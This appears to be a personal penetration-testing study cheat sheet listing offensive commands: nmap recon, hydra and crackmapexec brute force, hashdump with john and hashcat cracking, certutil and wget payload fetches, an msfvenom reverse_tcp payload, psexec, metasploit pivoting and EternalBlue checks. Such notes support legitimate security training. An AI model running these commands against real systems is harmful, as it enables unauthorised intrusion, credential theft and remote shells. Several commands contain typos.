
Assessment methodologies 
- Locate endpoints on a network 
	- `nmap -sC -sV -oA nmap_results ip `
	- `nmap -sS -Pn -A -p- -oN results_nmap ip` 
- identify vulnerabilities in services
	- `nmap -sS -Pn -p port --script naam_script `
	- `ls -al /usr/share/nmap /script |grep -e "keyword"`
- identify operating system of a target 
- Identify open ports and services on a target 
- Extract company information from public sources
- Gather technical information from public sources
	- sitemap.xml
	- whatWeb 
	- dnsdumpster
	- Robot.txt 
	- Netcraft 
	- `dnsrecon -d domain `
	- `wafw00f domain `
	-  `sudo apt-get install sublist3r  `
		- `sublist3r -e`  
		- `sublist3r -d `
- Gather email addresses from public sources 
- Evaluate information and critically or impact of vulnerabilities 


Host & Network Auditing 
- Transfer files to and from target 
	- `SimpleHTTPServer` = python2
	- ` http.server` = python3
	-  Windows:`certutil -urlcache -f http://adres_webserver
	- Linux: `wget http://adres_webserver/filename.exe `
- Enumerate system information on target 
	- Windows: `getuid` `sysinfo`  
	- Linux: `hostname, /etc/issue, /etc/*release, uname -a, env, free -h, df -h` 
- Gather user account information on target 
	- Windows: `getprivs` `getuid` , shell: `whoami, whoami/priv, net user administator, netuser guest, net localgroup, net localgroup ``administrators` ,  `use post/windows/gather/enum_logged_on_users` 
	  `net user administrator 
           `net user guest `
	   `net localgroup` `
	- Linux: `/etc/passwd, ls -al /home, groups, groups user_name, who lat lastlog`
- Enumerate network information from files on target 
	- Windows: shell: `ipconfig, piconfig /all route print arp-a netstat -ano netsh firewall show state, netsh firewall show state, netsh advfirewall firewall` 
	- Linux: `ifconfig, ip a s, /etc/host, /etc/networks, /etc/resolv.config, arp -a, arp, `
- Compile information from files on target 
	- Cross-Compiling Exploits:
		- compile for 64 bit systems `i686-w64-mingw32-gcc c_file -o portable_executable_file_name`
		- compile for 32 bit system: `i686-w64-mingw32-mingw32-gcc c_file -o portable_executable_file_name -lws2_32 
	- compilation with gcc is only for linux 
- Linux cronjobs: `top, ps, ps aux, ls -al /etc/cron*, /etc/cron*, `
- Gather hash/password information from target 
	- `hashdump` 


Window's enumeration: 

- metasploit module win_privs 
- metasploit module enum_logged_on_users 
- metasploit module checkvm 
- metasploit module enum_applications (
- metasploit module enum_computers  
- metasploit module enum_patches session)
- metasploit module enum_shares 
- JAWS


Linux enumeration: 
- post/linux/gather/enum_configs   
- post/linux/gather/enum_network 
- post/linux/gather/enum_system 
- post/linux/gather/enum_checkvm 
- LinEnum 
 

Host & Networking Pentesting 
- Conduct hash cracking 
		- `hashdump` 
		- Windows
			- ``john --format=NT file --wordlist=/usr/share.wordlist/rockyou.txt
			- ``hashcat -a3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt ``
		- Linux 
			- `` john --format=sha512crypt path_that_contain_hash.txt --wordlist=/usr/share/wordlsits/rockyou.txt ``
			- ``hashcat -a3 -m 1800 path_contains_hashes.txt wordlist_path``
- Identify and modify exploits 
	- `searchsploit` 
- Conduct brute-force password attacks 
	- `hydra` 
	- `nmap ip --script ftp-brute --script-args usersb=/root/users -p 21
	- `nmap ip -p port --script {bruteforce script} --script-args userdb=/root/user``
- Conduct exploitation with metasploit 
- Demonstrate pivoting by adding a route 
	- ``run autoroute -s subnetrange_victim1 
- Demonstrating pivoting by port forwarding 
	- ``portfwd add -l 1234 -p 80 -r victim2_ip
	- Scan victim 2 ``nmap -sV -p 1234 localhost``
	- meterpreter victim 2: ``windows/meterpreter/bind_tcp`` 



Web application Pentesting 
- Conduct webapp reconnaissance
- Conduct brute-force login attack
- locate hidden file and directories 
- Identify vulnerabilities in webapp


---


Linux vulnerabilities: 
- Shellshock - CVE-2014-6271- cgi 
- FTP (21) 
	- Hydra: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt targetip -t 4 ftp ` 
		- start ftp 
	- ProFTPD (metasploit)
- SSH (22)
	- Hydra: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt targetip -t 4 ssh ` 
- SMB - SAMBA (445)
	- `hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt targetip smb `
	- `smbmap` 
	- `enum4linux -a target `

Windows vulnerabilities 
- WebDAV 
	- `nmap -sV -p 80 --script=http-enum target`
	- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your own ip) LPORT=port that is open on your system -f asp > meterpreter.asp`
				OF 
	- `use exploit/windows/iis/iis_webdav_upload_asp` 
- SMB met PsExec 
	- `search smb_login ` (metasploit) ![[Pasted image 20230703124308.png]]
	- `psexec.py Adminstrator@targetip command_that_you_want_to_execute `
		- `exploit/windows/smb/psexec`
- EternalBlue 
	- `sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 target`
- RDP (3389) 
	- sudo nmap -p 3389 targetip
	- `search rdp_scanner` (`aux/scanner/rdp/rdp_scanner`)
	- Hydra: 
		- `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://targetip  -s rdp'port`
	- `xfreerdp /u:administrator /p:qwertyuiop /v:targetip ` 
	- BlueKeep 
		- metasploit module bluekeep 
- WinRM (5985) (5986)
	- Bruteforce: `crackmapexec winrm  targetip -u adminstrator -p /usr/share/metasploit-framework/data/wordlists/unix_password.txt`
	- shell session: `evil-winrm.rb -u username -p 'password' -i targetip`
	- meterpreter session: `winrm_script_exec `


WIndows Vulnerabilities 
- Bypass UAC 
	- user is part of local administrator group: `net localgroup administrators `
- Access Token Impersonation 
	- windows/meterpreter/reverse_tcp
	- `getprivs` -> SeImpersonatePrivilige needs to be present 
- Alternate Data streams 
	- 